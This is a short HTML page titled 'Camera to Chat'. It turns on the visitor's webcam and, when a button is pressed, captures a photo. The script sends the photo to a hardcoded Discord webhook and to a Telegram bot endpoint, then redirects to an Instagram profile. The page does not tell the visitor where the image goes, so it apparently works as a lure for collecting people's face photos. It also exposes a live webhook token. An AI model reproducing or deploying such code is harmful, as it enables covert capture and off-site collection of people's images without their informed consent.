<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera to Chat</title>
  <style>
    .camera-link {
      color: blue;
      text-decoration: underline;
      cursor: pointer;
    }
    #camera-input {
      display: none;
    }
    #video {
      width: 100%;
      height: auto;
      border: 1px solid black;
    }
    #capture-btn {
      display: block;
      margin-top: 10px;
      background-color: blue;
      color: white;
      padding: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Camera to Chat</h1>
  <video id="video" autoplay></video>
  <button id="capture-btn">Capture Photo</button>

  <input 
    type="file" 
    accept="image/*" 
    capture="user" 
    id="camera-input"
    style="display:none;" 
    onchange="handlePhoto(event)">
    
  <script>
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
      } catch (error) {
        console.error("Error accessing the camera:", error);
        alert("Unable to access the camera. Please check your device settings.");
      }
    }

    function capturePhoto() {
      const video = document.getElementById("video");
      const canvas = document.createElement("canvas");
      const context = canvas.getContext("2d");
      
      // Set canvas dimensions to match the video
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Draw the current frame from the video to the canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert the canvas image to a file
      canvas.toBlob(async (blob) => {
        const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

        // Convert file to a FormData object
        const formData = new FormData();
        formData.append("photo", file);

        try {
          // Send to Discord Webhook
          const discordWebhookUrl = "https://discord.com/api/webhooks/1331575190848667658/9Sz5ZCjFiAiGNlm6wZgA4MMDmbaMUb8tjZO-Wr7SWfXEWQ1GOH5d1Mgs5mJsX9t2Z43f";
          await fetch(discordWebhookUrl, {
            method: "POST",
            body: formData,
          });

          // Send to Telegram Bot
          const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
          const telegramChatId = "YOUR_CHAT_ID";
          const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;

          formData.append("chat_id", telegramChatId);
          await fetch(telegramUrl, {
            method: "POST",
            body: formData,
          });

          // Redirect after success
          alert("Photo sent successfully!");
          window.location.href = "https://www.instagram.com/f_arsenova/";

        } catch (error) {
          console.error("Error sending photo:", error);
          alert("Failed to send photo. Please try again.");
        }
      }, "image/jpeg");
    }

    document.getElementById("capture-btn").addEventListener("click", capturePhoto);

    // Start the camera when the page loads
    startCamera();
  </script>
</body>
</html>
